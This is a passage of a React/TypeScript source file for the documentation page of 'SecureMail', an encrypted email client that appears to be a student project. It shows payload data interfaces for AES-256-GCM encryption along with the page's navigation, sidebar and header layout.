  id: string
  threadId: string
  from: string
  to: string
  subject: string        // '[SecureMail] encrypted message' before decrypt
  date: string
  snippet: string
  isEncrypted: boolean   // parsed from X-Encrypted header
  isRead: boolean
}`}</Code>

      <H3>MailDetail</H3>
      <Code lang="TypeScript">{`interface MailDetail extends MailMeta {
  to: string
  body: string           // raw body — may be JSON CryptoPayload string
  headers: Record<string, string>
}`}</Code>

      <H3>CryptoPayload</H3>
      <Code lang="TypeScript">{`interface CryptoPayload {
  version: string        // '1.0'
  mode: 'password'       // symmetric encryption only
  subject: string        // always empty — real subject inside ciphertext
  ciphertext: string     // base64url — AES-256-GCM encrypted body+subject
  iv: string             // base64url, 12 bytes — GCM nonce
  encryptedKey: string   // base64url — AES content key wrapped by AES-KW
  salt: string           // base64url, 16 bytes — PBKDF2 salt
}`}</Code>

      {/* ─── END ─── */}
      <div className="mt-16 rounded-lg border border-slate-200 bg-slate-50 p-6 text-center">
        <p className="text-sm text-slate-500">
          SecureMail Documentation &mdash; Nhóm 6, Khoa: Khoa học Dữ liệu, Trường Đại học Ngân hàng TP.HCM
        </p>
        <p className="mt-1 text-xs text-slate-400">
          GVHD: Nguyễn Hoài Đức &mdash; HK2 2025-2026
        </p>
      </div>
    </div>
  )
}

/* ═══════════════════════════════════════════════════════════════
   MAIN DOCS PAGE
   ═══════════════════════════════════════════════════════════════ */
export function Docs() {
  const navigate = useNavigate()
  const [sidebarOpen, setSidebarOpen] = useState(false)
  const [activeId, setActiveId] = useState('overview')
  const { lang, toggle, t } = useLang()

  const nav = getNAV(t)

  function scrollTo(id: string) {
    setActiveId(id)
    setSidebarOpen(false)
    const el = document.getElementById(id)
    if (el) {
      el.scrollIntoView({ behavior: 'smooth', block: 'start' })
    }
  }

  return (
    <div className="min-h-screen bg-white font-[Lexend] text-slate-800 antialiased">
      {/* ─── Top nav ─── */}
      <nav className="sticky top-0 z-50 border-b border-slate-200 bg-white/90 backdrop-blur">
        <div className="mx-auto flex max-w-[90rem] items-center justify-between px-6 py-3">
          <div className="flex items-center gap-4">
            {/* Mobile menu */}
            <button
              onClick={() => setSidebarOpen(!sidebarOpen)}
              className="cursor-pointer rounded-lg p-2 text-slate-500 hover:bg-slate-100 lg:hidden"
              aria-label="Toggle menu"
            >
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={2} className="h-5 w-5">
                <path strokeLinecap="round" strokeLinejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5" />
              </svg>
            </button>

            <button onClick={() => navigate('/')} className="flex cursor-pointer items-center gap-2">
              <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-blue-600 text-white">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={2} className="h-4 w-4">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75 11.25 15 15 9.75m-3-7.036A11.959 11.959 0 0 1 3.598 6 11.99 11.99 0 0 0 3 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285Z" />
                </svg>
              </div>
              <span className="text-base font-semibold text-slate-900">SecureMail</span>
            </button>

            <span className="rounded-full bg-slate-100 px-3 py-1 text-xs font-semibold text-slate-500">{t('Docs', 'Tài liệu')}</span>
          </div>

          <div className="flex items-center gap-3">
            <LangToggle lang={lang} toggle={toggle} />
            <a
              href="https://github.com/trieu1910/securemail"
              target="_blank"
              rel="noopener noreferrer"
              className="flex items-center gap-1.5 rounded-lg px-3 py-2 text-sm text-slate-600 hover:bg-slate-100"
            >
              <svg viewBox="0 0 24 24" fill="currentColor" className="h-4 w-4">
                <path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0 0 24 12c0-6.63-5.37-12-12-12Z" />
              </svg>
              GitHub
            </a>
            <button
              onClick={() => navigate('/login')}
              className="cursor-pointer rounded-lg bg-blue-600 px-4 py-2 text-sm font-medium text-white hover:bg-blue-700"
            >
              {t('Open App', 'Mở ứng dụng')}
            </button>
          </div>
        </div>
      </nav>

      <div className="mx-auto flex max-w-[90rem]">
        {/* ─── Sidebar ─── */}
        {/* Mobile overlay — rendered outside sidebar for correct stacking */}
        {sidebarOpen && (
          <div className="fixed inset-0 z-30 bg-black/20 lg:hidden" onClick={() => setSidebarOpen(false)} />
        )}
        <aside className={`fixed inset-y-0 left-0 z-40 w-64 sm:w-72 transform overflow-y-auto border-r border-slate-200 bg-white pt-16 transition-transform lg:sticky lg:top-14 lg:block lg:h-[calc(100vh-3.5rem)] lg:translate-x-0 ${
          sidebarOpen ? 'translate-x-0' : '-translate-x-full'
        }`}>

          <nav className="relative z-10 bg-white p-6">
            {nav.map((group) => (
              <div key={group.group} className="mb-6">
                <p className="mb-2 text-xs font-bold uppercase tracking-wider text-slate-400">{group.group}</p>
                <ul className="space-y-0.5">
                  {group.items.map((item) => (
                    <li key={item.id}>
                      <button
                        onClick={() => scrollTo(item.id)}
                        className={`w-full cursor-pointer rounded-lg px-3 py-2 text-left text-sm transition-colors ${
                          activeId === item.id
                            ? 'bg-blue-50 font-medium text-blue-700'
                            : 'text-slate-600 hover:bg-slate-50 hover:text-slate-900'
                        }`}
                      >
                        {item.label}
                      </button>
                    </li>
                  ))}
                </ul>
              </div>
            ))}
          </nav>
        </aside>

        {/* ─── Content ─── */}
        <main className="min-w-0 flex-1 px-8 py-10 lg:px-16">
          <div className="mx-auto max-w-3xl">
            {/* Page header */}
            <div className="mb-10">
              <p className="mb-2 text-sm font-semibold text-blue-600">{t('Documentation', 'Tài liệu')}</p>
              <h1 className="text-3xl font-bold text-slate-900 md:text-4xl">{t('SecureMail Technical Docs', 'Tài liệu kỹ thuật SecureMail')}</h1>
              <p className="mt-3 text-lg text-slate-500">
                {t(
                  'End-to-end encrypted email client — architecture, encryption protocols, and implementation details.',
                  'Ứng dụng email mã hóa đầu cuối — kiến trúc, giao thức mã hóa và chi tiết triển khai.'
                )}
              </p>
              <div className="mt-4 flex flex-wrap gap-2">
                {['AES-256-GCM', 'PBKDF2', 'Web Crypto API', 'OAuth2 PKCE', 'Zero Backend'].map((tag) => (
                  <span key={tag} className="rounded-full border border-slate-200 bg-slate-50 px-3 py-1 text-xs font-medium text-slate-600">
                    {tag}
                  </span>
                ))}
              </div>
            </div>

            <DocsContent t={t} />
          </div>
        </main>
      </div>
    </div>
  )
}
